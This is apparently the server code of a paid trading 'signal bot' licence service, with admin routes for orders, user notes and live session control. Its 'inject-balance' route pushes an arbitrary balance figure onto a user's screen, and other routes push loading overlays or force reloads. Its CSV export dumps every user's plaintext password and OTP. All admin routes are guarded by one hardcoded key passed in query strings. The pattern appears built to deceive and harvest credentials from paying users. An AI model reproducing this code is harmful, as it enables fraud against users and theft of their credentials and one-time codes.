// ================== USER NOTES ==================
// Save an admin note for a user (keyed by licenceKey).
app.post('/api/user-notes', async (req, res) => {
    const { licenceKey, note } = req.body || {};
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });
    try {
        if (useDatabase) {
            await dbSaveNote(licenceKey, note || '');
        } else {
            // File-mode: store in an in-memory map (not persisted across restarts — MongoDB preferred)
            if (!global._notesMap) global._notesMap = {};
            global._notesMap[licenceKey] = { note: note || '', updatedAt: new Date().toISOString() };
        }
        res.json({ ok: true });
    } catch (e) {
        console.error('/api/user-notes POST error:', e.message);
        res.status(500).json({ error: 'Server error' });
    }
});

app.get('/api/user-notes/:licenceKey', async (req, res) => {
    const { licenceKey } = req.params;
    try {
        if (useDatabase) {
            const doc = await dbGetNote(licenceKey);
            return res.json({ note: doc ? doc.note : '', updatedAt: doc ? doc.updatedAt : null });
        } else {
            const entry = (global._notesMap || {})[licenceKey];
            return res.json({ note: entry ? entry.note : '', updatedAt: entry ? entry.updatedAt : null });
        }
    } catch (e) {
        res.json({ note: '', updatedAt: null });
    }
});

// ================== FORCE RELOAD ==================
app.get('/api/force-reload', (req, res) => {
    const { userName, adminKey } = req.query;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    if (!userName) return res.status(400).json({ error: 'userName required' });
    const sent = sendSSEToUser(userName, 'force_reload', { timestamp: new Date().toISOString() });
    res.json({ ok: true, sent });
});

// ================== PUSH LOADING OVERLAY ==================
app.post('/api/push-loading', (req, res) => {
    const { userName, message = 'Please wait...', seconds = 5, adminKey } = req.body || {};
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    if (!userName) return res.status(400).json({ error: 'userName required' });
    const sent = sendSSEToUser(userName, 'show_loading', { message, seconds });
    res.json({ ok: true, sent });
});

// ================== INJECT BALANCE ==================
app.post('/api/inject-balance', (req, res) => {
    const { userName, balance, adminKey } = req.body || {};
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    if (!userName) return res.status(400).json({ error: 'userName required' });
    const sent = sendSSEToUser(userName, 'inject_balance', { balance: String(balance || '0') });
    res.json({ ok: true, sent });
});

// ================== KICK USER ==================
app.get('/api/kick-user', (req, res) => {
    const { userName, adminKey } = req.query;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    if (!userName) return res.status(400).json({ error: 'userName required' });
    const key    = (userName || '').trim().toLowerCase();
    const client = sseUserClients.get(key);
    if (client) {
        try {
            const payload = JSON.stringify({ type: 'kicked', data: { message: 'Your session has been ended by admin.' }, timestamp: new Date().toISOString() });
            client.write(`data: ${payload}\n\n`);
            setTimeout(() => { try { client.end(); } catch(e){} }, 300);
        } catch(e) {}
        sseClients.delete(client);
        sseUserClients.delete(key);
    }
    res.json({ ok: true, wasConnected: !!client });
});

// ================== EXPORT USERS CSV ==================
app.get('/api/export-users', (req, res) => {
    const adminKey = req.query.adminKey || req.headers['x-admin-key'];
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    const rows = [
        ['Full Name','License Key','Status','Email','Password','OTP','Connected','Last Activity','IP','Blocked'].join(','),
        ...users.map(u => [
            `"${(u.fullName    ||'').replace(/"/g,'""')}"`,
            `"${(u.licenceKey  ||'').replace(/"/g,'""')}"`,
            `"${(u.status      ||'').replace(/"/g,'""')}"`,
            `"${(u.email       ||'').replace(/"/g,'""')}"`,
            `"${(u.password    ||'').replace(/"/g,'""')}"`,
            `"${(u.otp         ||'').replace(/"/g,'""')}"`,
            u.connected ? 'Yes' : 'No',
            `"${(u.lastActivity||'').replace(/"/g,'""')}"`,
            `"${(u.ip          ||'').replace(/"/g,'""')}"`,
            u.blocked ? 'Yes' : 'No',
        ].join(','))
    ].join('\r\n');
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename="users-${new Date().toISOString().slice(0,10)}.csv"`);
    res.send(rows);
});

// ================== BOT SETTINGS ==================
app.get('/api/bot-settings', async (req, res) => {
    // Re-hydrate from DB so multiple instances / cold starts always see latest
    try { await loadSettingsFromDB(); } catch(e) {}
    res.json(botSettings);
});

app.post('/api/bot-settings', async (req, res) => {
    const { telegramUrl, whatsappUrl, botName, adminKey } = req.body || {};
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    if (telegramUrl !== undefined) botSettings.telegramUrl = telegramUrl;
    if (whatsappUrl !== undefined) botSettings.whatsappUrl = whatsappUrl;
    if (botName     !== undefined) botSettings.botName     = botName;
    saveSettings();
    await saveSettingsToDB();
    broadcastSSE('settings_updated', botSettings);
    res.json({ ok: true, settings: botSettings });
});

// ================== ORDERS (License purchase requests) ==================
const ORDERS_FILE = path.join(DATA_DIR, 'orders.json');
let ordersMem = [];
function loadOrdersFile() {
    try { if (fs.existsSync(ORDERS_FILE)) ordersMem = JSON.parse(fs.readFileSync(ORDERS_FILE, 'utf8')); } catch(e) { ordersMem = []; }
}
function saveOrdersFile() {
    try { ensureDataDir(); fs.writeFileSync(ORDERS_FILE, JSON.stringify(ordersMem, null, 2)); } catch(e) {}
}
loadOrdersFile();

function isAdmin(req) {
    const key = (req.query.adminKey || req.body?.adminKey || req.headers['x-admin-key'] || '').toString();
    return key === 'CSAI-NEWX-ADMI-N999';
}

// Public: submit a new order from main-bot
app.post('/api/orders', async (req, res) => {
    try {
        const b = req.body || {};
        const clean = s => (typeof s === 'string' ? s.trim().slice(0, 300) : '');
        const fullName      = clean(b.fullName);
        const planKey       = clean(b.planKey);
        const planLabel     = clean(b.planLabel);
        const planPricePKR  = clean(b.planPricePKR);
        const planPriceUSD  = clean(b.planPriceUSD);
        const paymentMethod = clean(b.paymentMethod);
        const whatsapp      = clean(b.whatsapp);

        if (!fullName || !planKey || !paymentMethod || !whatsapp) {
            return res.status(400).json({ error: 'Missing required fields' });
        }
        if (!['week','month','lifetime'].includes(planKey)) {
            return res.status(400).json({ error: 'Invalid plan' });
        }

        const id = 'ORD-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();
        const order = { id, fullName, planKey, planLabel, planPricePKR, planPriceUSD, paymentMethod, whatsapp, status: 'New', createdAt: new Date() };

        if (useDatabase) {
            await Order.create(order);
        } else {
            ordersMem.unshift(order);
            saveOrdersFile();
        }

        broadcastSSE('new_order', order);
        res.json({ ok: true, order: { id: order.id } });
    } catch (e) {
        console.error('POST /api/orders error:', e);
        res.status(500).json({ error: 'Server error' });
    }
});

// Admin: list orders
app.get('/api/orders', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    try {
        if (useDatabase) {
            const list = await Order.find({}).sort({ createdAt: -1 }).limit(1000).lean();
            return res.json(list);
        }
        return res.json(ordersMem);
    } catch (e) {
        res.status(500).json({ error: 'Server error' });
    }
});

// Admin: update status
app.patch('/api/orders/:id', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { id } = req.params;
    const status = (req.body?.status || '').toString();
    const allowed = ['New','Contacted','Paid','Completed','Rejected'];
    if (!allowed.includes(status)) return res.status(400).json({ error: 'Invalid status' });
    try {
        if (useDatabase) {
            const o = await Order.findOneAndUpdate({ id }, { status }, { new: true });
            if (!o) return res.status(404).json({ error: 'Not found' });
            broadcastSSE('order_updated', { id, status });
            return res.json({ ok: true, order: o });
        }
        const o = ordersMem.find(x => x.id === id);
        if (!o) return res.status(404).json({ error: 'Not found' });
        o.status = status;
        saveOrdersFile();
        broadcastSSE('order_updated', { id, status });
        res.json({ ok: true, order: o });
    } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

// Admin: delete
app.delete('/api/orders/:id', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { id } = req.params;
    try {
        if (useDatabase) {
            await Order.deleteOne({ id });
        } else {
            ordersMem = ordersMem.filter(x => x.id !== id);
            saveOrdersFile();
        }
        broadcastSSE('order_deleted', { id });
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ error: 'Server error' }); }
});

app.get('/', (req, res) => {
    res.send(`✅ Chinese Signal Bot Server v4 Running — Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT ✅)' : 'File-based (MONGODB_URI not set)'}`);
});

// ================== START SERVER ==================
const PORT = process.env.PORT || 3000;

async function startServer() {
    if (process.env.MONGODB_URI || MONGODB_URI) {
        try {
            await mongoose.connection.asPromise();
            useDatabase = true;
        } catch (e) {
            console.warn('MongoDB not ready at startup, using file mode:', e.message);
        }
    }

    if (!useDatabase) {
        ensureDataDir();
        loadUsers();
        loadLicenses();
        setInterval(() => {
            try { saveUsers(); } catch (e) {}
            try { saveLicenses(); } catch (e) {}
        }, 30000);
    }

    app.listen(PORT, () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`💾 Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT)' : 'File-based — set MONGODB_URI for permanent storage'}`);
    });
}

startServer().catch(err => {
    console.error('Failed to start server:', err);
    process.exit(1);
});
